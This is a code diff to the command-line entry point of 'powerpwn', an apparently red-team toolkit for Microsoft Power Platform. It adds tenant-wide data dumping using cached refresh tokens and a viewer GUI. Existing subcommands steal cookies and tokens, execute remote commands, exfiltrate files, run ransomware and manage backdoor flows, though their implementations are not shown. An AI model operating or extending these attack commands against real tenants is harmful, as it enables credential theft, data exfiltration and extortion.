@@ -1,6 +1,8 @@
 import argparse
 import json
 import logging
+import os
+import shutil
 
 from art import tprint
 
@@ -10,71 +12,95 @@ from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
 from powerpwn.machinepwn.machine_pwn import MachinePwn
 from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
 from powerpwn.powerdoor.enums.action_type import ActionType
+from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
+from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
+from powerpwn.powerdump.gui.gui import Gui
+from powerpwn.powerdump.utils.auth import acquire_token, acquire_token_from_cached_refresh_token
+from powerpwn.powerdump.utils.const import API_HUB_SCOPE, CACHE_PATH, POWER_APPS_SCOPE
 
 logger = logging.getLogger(LOGGER_NAME)
 
 
-def register_machine_pwn_common_args(sub_parser: argparse.ArgumentParser):
+def register_gui_parser(sub_parser: argparse.ArgumentParser) -> None:
+    gui_parser = sub_parser.add_parser("gui", description="Show collected resources and data.", help="Show collected resources and data via GUI.")  # type: ignore[attr-defined]
+    gui_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
+    gui_parser.add_argument("--cache-path", default=CACHE_PATH, type=str, help="Path to cached resources.")
+
+
+def register_collect_parser(sub_parser: argparse.ArgumentParser) -> None:
+    explore_parser = sub_parser.add_parser(  # type: ignore[attr-defined]
+        "dump", description="Collect all available data in tenant", help="Get all available resources in tenant and dump data."
+    )
+    explore_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
+    explore_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
+    explore_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
+    explore_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
+    explore_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")
+
+
+def register_machine_pwn_common_args(sub_parser: argparse.ArgumentParser) -> None:
     sub_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
     sub_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
 
 
-def register_backdoor_flow_common_args(sub_parser: argparse.ArgumentParser):
+def register_backdoor_flow_common_args(sub_parser: argparse.ArgumentParser) -> None:
     sub_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
     sub_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
     sub_parser.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")
 
 
-def register_exec_parsers(command_subparsers: argparse.ArgumentParser):
-    steal_fqdn_parser = command_subparsers.add_parser("steal-cookie", description="Steal cookie of fqdn")
+def register_exec_parsers(command_subparsers: argparse.ArgumentParser) -> None:
+    steal_fqdn_parser = command_subparsers.add_parser("steal-cookie", description="Steal cookie of fqdn")  # type: ignore[attr-defined]
     register_steal_fqdn_cookie_parser(steal_fqdn_parser)
 
-    steal_power_automate_token_parser = command_subparsers.add_parser("steal-power-automate-token", description="Steal power automate token")
+    steal_power_automate_token_parser = command_subparsers.add_parser("steal-power-automate-token", description="Steal power automate token")  # type: ignore[attr-defined]
     register_machine_pwn_common_args(steal_power_automate_token_parser)
 
-    execute_command_parser = command_subparsers.add_parser("command-exec", description="Execute command on machine")
+    execute_command_parser = command_subparsers.add_parser("command-exec", description="Execute command on machine")  # type: ignore[attr-defined]
     register_exec_command_parser(execute_command_parser)
 
-    ransomware_parser = command_subparsers.add_parser("ransomware", description="Ransomware")
+    ransomware_parser = command_subparsers.add_parser("ransomware", description="Ransomware")  # type: ignore[attr-defined]
     register_ransomware_parser(ransomware_parser)
 
-    exflirtate_file_parser = command_subparsers.add_parser("exflirtate", description="Exflirtate file")
+    exflirtate_file_parser = command_subparsers.add_parser("exflirtate", description="Exflirtate file")  # type: ignore[attr-defined]
     register_exflirtate_file_parser(exflirtate_file_parser)
 
-    cleanup_parser = command_subparsers.add_parser("cleanup", description="Cleanup")
+    cleanup_parser = command_subparsers.add_parser("cleanup", description="Cleanup")  # type: ignore[attr-defined]
     register_machine_pwn_common_args(cleanup_parser)
 
 
 ## machine pwn parsers ##
-def register_steal_fqdn_cookie_parser(sub_parser: argparse.ArgumentParser):
+def register_steal_fqdn_cookie_parser(sub_parser: argparse.ArgumentParser) -> None:
     register_machine_pwn_common_args(sub_parser)
     sub_parser.add_argument("-fqdn", "--cookie", required=True, type=str, help="Fully qualified domain name to fetch the cookies of")
 
 
-def register_exec_command_parser(sub_parser: argparse.ArgumentParser):
+def register_exec_command_parser(sub_parser: argparse.ArgumentParser) -> None:
     register_machine_pwn_common_args(sub_parser)
     sub_parser.add_argument("-t", "--type", required=True, type=str, choices=[cmd_type.value for cmd_type in CodeExecTypeEnum], help="Command type")
     sub_parser.add_argument("-c", "--command-to-execute", required=True, type=str, help="Command to execute")
 
 
-def register_ransomware_parser(sub_parser: argparse.ArgumentParser):
+def register_ransomware_parser(sub_parser: argparse.ArgumentParser) -> None:
     register_machine_pwn_common_args(sub_parser)
     sub_parser.add_argument("--crawl_depth", required=True, type=str, help="Recursively search into subdirectories this many times")
     sub_parser.add_argument("-k", "--encryption-key", required=True, type=str, help="an encryption key used to encrypt each file identified (AES256)")
     sub_parser.add_argument(
-        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')"
+        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a comma (e.g.'C:\\,D:\\')"
     )
 
 
-def register_exflirtate_file_parser(sub_parser: argparse.ArgumentParser):
+def register_exflirtate_file_parser(sub_parser: argparse.ArgumentParser) -> None:
     register_machine_pwn_common_args(sub_parser)
     sub_parser.add_argument("-f", "--file", required=True, type=str, help="Absolute path to file")
 
 
-def parse_arguments():
+def parse_arguments() -> argparse.Namespace:
     parser = argparse.ArgumentParser()
     parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
     command_subparsers = parser.add_subparsers(help="command", dest="command")
+    register_collect_parser(command_subparsers)  # type: ignore[arg-type]
+    register_gui_parser(command_subparsers)  # type: ignore[arg-type]
 
     ## Delete Flow parser ##
     delete_flow_parser = command_subparsers.add_parser("delete-flow", description="Deletes flow.", help="Deletes flow using installed backdoor flow.")
@@ -95,13 +121,45 @@ def parse_arguments():
     register_backdoor_flow_common_args(get_connections_parser)
     get_connections_parser.add_argument("-o", "--output", type=str, default="", help="Path to output file.")
 
-    register_exec_parsers(command_subparsers)
+    register_exec_parsers(command_subparsers)  # type: ignore[arg-type]
     args = parser.parse_args()
 
     return args
 
 
-def run_backdoor_flow_command(args):
+def __init_command_token(args: argparse.Namespace, scope: str) -> str:
+    # if cached refresh token is found, use it
+    if token := acquire_token_from_cached_refresh_token(scope, args.tenant):
+        return token
+
+    return acquire_token(scope=scope, tenant=args.tenant)
+
+
+def run_collect_resources_command(args: argparse.Namespace) -> None:
+    # cache
+    if args.clear_cache:
+        try:
+            shutil.rmtree(args.cache_path)
+        except FileNotFoundError:
+            pass
+    os.makedirs(args.cache_path, exist_ok=True)
+
+    token = __init_command_token(args, POWER_APPS_SCOPE)
+
+    entities_fetcher = ResourcesCollector(token=token, cache_path=args.cache_path)
+    entities_fetcher.collect_and_cache()
+
+
+def run_gui_command(args: argparse.Namespace) -> None:
+    Gui().run(cache_path=args.cache_path)
+
+
+def run_collect_data_command(args: argparse.Namespace) -> None:
+    token = __init_command_token(args, API_HUB_SCOPE)
+    DataCollector(token=token, cache_path=args.cache_path).collect()
+
+
+def run_backdoor_flow_command(args: argparse.Namespace) -> None:
     action_type = ActionType(args.command)
     backdoor_flow = BackdoorFlow(args.webhook_url)
     if action_type == ActionType.delete_flow:
@@ -120,7 +178,7 @@ def run_backdoor_flow_command(args):
             logger.info(connections)
 
 
-def run_machine_pwn_command(args):
+def run_machine_pwn_command(args: argparse.Namespace) -> None:
     command_type = CommandToRunEnum(args.command)
     machine_pwn = MachinePwn(args.webhook_url)
     if command_type == CommandToRunEnum.CLEANUP:
@@ -130,7 +188,7 @@ def run_machine_pwn_command(args):
     elif command_type == CommandToRunEnum.EXFILTRATION:
         res = machine_pwn.exfiltrate(args.file)
     elif command_type == CommandToRunEnum.RANSOMWARE:
-        res = machine_pwn.ransomware(args.crawl_depth, args.dirs, args.encryption_key)
+        res = machine_pwn.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
     elif command_type == CommandToRunEnum.STEAL_COOKIE:
         res = machine_pwn.steal_cookie(args.cookie)
     elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
@@ -138,7 +196,7 @@ def run_machine_pwn_command(args):
     print(res)
 
 
-def main():
+def main() -> None:
     print("\n\n------------------------------------------------------------")
     tprint("powerpwn")
     print("------------------------------------------------------------\n\n")
@@ -149,7 +207,18 @@ def main():
     logger.level = args.log_level
     command = args.command
 
-    if command in [action_type.value for action_type in ActionType]:
+    if command == "dump":
+        run_collect_resources_command(args)
+        run_collect_data_command(args)
+        logger.info(f"Dump is completed in {args.cache_path}")
+        if args.gui:
+            logger.info("Going to run local server for gui")
+            run_gui_command(args)
+
+    elif command == "gui":
+        run_gui_command(args)
+
+    elif command in [action_type.value for action_type in ActionType]:
         run_backdoor_flow_command(args)
 
     elif command in [cmd_type.value for cmd_type in CommandToRunEnum]:
